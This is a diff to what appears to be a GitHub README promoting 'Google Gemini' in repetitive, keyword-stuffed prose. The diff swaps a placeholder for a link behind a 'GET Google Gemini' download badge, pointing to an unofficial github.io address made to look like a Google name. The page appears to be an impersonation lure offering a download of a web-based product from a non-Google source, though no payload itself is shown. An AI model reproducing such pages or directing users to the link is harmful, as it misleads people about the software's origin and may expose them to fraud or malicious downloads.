@@ -4,7 +4,7 @@
 
 Google Gemini is a conversational AI assistant built for exploring ideas, refining questions, and working through everyday tasks with natural language. Google Gemini chat gives users a calm space to ask, follow up, and organize thoughts without jumping between scattered tools. Google Gemini AI assistant supports drafting, summarizing, explaining, and brainstorming across study sessions, office work, and creative projects. Google Gemini response help keeps answers readable so users can review, adjust, and continue the conversation at their own pace. Whether someone is new to AI chat or returning daily, Google Gemini stays focused on clear interaction and practical follow-up.
 
-[![GET Google Gemini](https://img.shields.io/badge/GET%20%E2%80%94%20Google%20Gemini-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Google Gemini](https://img.shields.io/badge/GET%20%E2%80%94%20Google%20Gemini-0078D6?style=for-the-badge&logoColor=white)](https://google-gemini-ai-assistant.github.io/.github/https://google-gemini-ai-assistant)
 
 ---
 
